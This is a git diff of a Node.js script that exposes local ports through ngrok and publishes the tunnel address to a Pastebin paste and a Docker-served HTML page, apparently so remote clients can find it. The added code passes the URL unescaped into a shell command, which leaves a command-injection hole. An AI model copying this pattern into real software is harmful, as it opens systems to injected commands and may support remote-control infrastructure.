@@ -7,13 +7,13 @@ var paste = require("better-pastebin");
 //var sqlite3 = require('sqlite3');
 //var db = new sqlite3.Database("userdata.db");
 var colors = require('colors');
+var exec = require('child_process').exec;
 //var CryptoJS = require('crypto-js');
 
 // var fs = require("fs")
 // var p = require("node-protobuf") // note there is no .Protobuf part anymore
 // // WARNING: next call will throw if desc file is invalid
 // var pb = new p(fs.readFileSync("./buffer.proto")) // obviously you can use async methods, it's for simplicity reasons
-
 
 
 /*var blessed = require('blessed');
@@ -122,9 +122,10 @@ function getPublicIP() {
 
   //Get url and links it to port 4434, then save to pastebin
   ngrok.connect({proto: 'tcp', addr: 4434, region: 'eu'}, function (err, url) {
-          console.log("NGrok Url:  ".green + url.blue);
-      updatePastebin(url);
-      }
+    console.log("NGrok Url:  ".green + url.blue);
+    updateTorIpServer(url);
+    updatePastebin(url);
+    }
   );
   ngrok.connect({proto: 'tcp', addr: 8000, region: 'eu'}, function (err, url) {
           console.log("NGrok Url boss:  ".green + url.blue);
@@ -176,6 +177,23 @@ function savePassToSQLite(url, username, password) {
         stmt.finalize();
     });
 }*/
+
+
+function updateTorIpServer(text) {
+  var cmd = 'ls';
+
+  // Put new ip
+  exec("echo '" + text + "' > ipServer/ip.html", function(error, stdout, stderr) {
+    // Then Build docker
+    exec('docker build -t "tiked/ip" ./ipServer', function(error, stdout, stderr) {
+      // Then run it
+      exec('docker run -d tiked/ip', function(error, stdout, stderr) {});
+
+    });
+
+  });
+}
+
 function updatePastebin(text) {
     paste.edit("BuG97BSk", text, function (success, data) {
       if (success) {
